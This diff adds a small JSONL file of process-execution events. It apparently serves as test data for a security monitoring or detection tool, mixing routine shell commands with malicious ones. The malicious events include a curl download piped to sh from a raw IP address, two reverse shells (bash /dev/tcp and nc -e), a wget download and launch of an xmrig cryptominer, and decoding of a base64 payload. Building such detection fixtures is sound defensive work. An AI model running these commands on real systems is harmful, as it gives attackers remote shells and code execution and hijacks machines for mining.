@@ -1,0 +1,14 @@
+{"event_type":"execve","executable":"/usr/bin/ls","argv":["ls","-la","/home/ron"],"pid":2001,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/usr/bin/cat","argv":["cat","README.md"],"pid":2002,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/usr/bin/git","argv":["git","status"],"pid":2003,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/usr/bin/python3","argv":["python3","manage.py","runserver"],"pid":2004,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/usr/bin/curl","argv":["curl","-fsSL","https://get.docker.com","-o","get-docker.sh"],"pid":2005,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/usr/bin/bash","argv":["bash","-c","curl -fsSL http://185.220.101.5/s.sh | sh"],"pid":2006,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/usr/bin/bash","argv":["bash","-c","bash -i >& /dev/tcp/10.0.0.9/4444 0>&1"],"pid":2007,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/usr/bin/chmod","argv":["chmod","777","/tmp/.hidden/payload"],"pid":2008,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/usr/bin/wget","argv":["wget","http://185.220.101.5/xmrig","-O","/tmp/xmrig"],"pid":2009,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/tmp/xmrig","argv":["/tmp/xmrig","--coin","monero","-o","pool.minexmr.com:4444"],"pid":2010,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/usr/bin/base64","argv":["base64","-d","payload.b64"],"pid":2011,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/usr/bin/nc","argv":["nc","-e","/bin/sh","10.0.0.9","4444"],"pid":2012,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/usr/bin/whoami","argv":["whoami"],"pid":2013,"ppid":1990,"comm":"bash","parent_comm":"bash"}
+{"event_type":"execve","executable":"/usr/bin/echo","argv":["echo","deployment complete"],"pid":2014,"ppid":1990,"comm":"bash","parent_comm":"bash"}
